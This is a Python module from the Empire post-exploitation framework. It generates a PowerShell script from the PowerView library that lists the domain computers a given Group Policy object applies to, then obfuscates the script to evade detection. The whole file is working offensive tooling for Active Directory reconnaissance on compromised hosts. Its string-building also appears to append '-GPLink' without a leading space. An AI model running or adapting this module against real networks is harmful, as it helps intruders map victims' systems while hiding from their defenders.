from __future__ import print_function

from builtins import str
from builtins import object
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # read in the common powerview.ps1 module source code
        module_source = main_menu.installPath + "/data/module_source/situational_awareness/network/powerview.ps1"

        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""

        module_name = 'Get-GPOComputer'
        module_code = f.read()
        f.close()

        # get just the code needed for the specified function
        script = helpers.strip_powershell_comments(module_code)

        script += "\nGet-DomainOU "

        for option, values in params.items():
            if option.lower() != "agent" and option.lower() != "guid":
                if values and values != '':
                    if values.lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values)

        script += "-GPLink " + str(params['GUID']) + " | %{ Get-DomainComputer -SearchBase $_.distinguishedname"

        for option, values in params.items():
            if option.lower() != "agent" and option.lower() != "guid":
                if values and values != '':
                    if values.lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values)

        script += '} | Out-String | %{$_ + \"`n\"};"`n' + str(module_name) + ' completed!"'
        if obfuscate:
            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
        script = helpers.keyword_obfuscation(script)

        return script
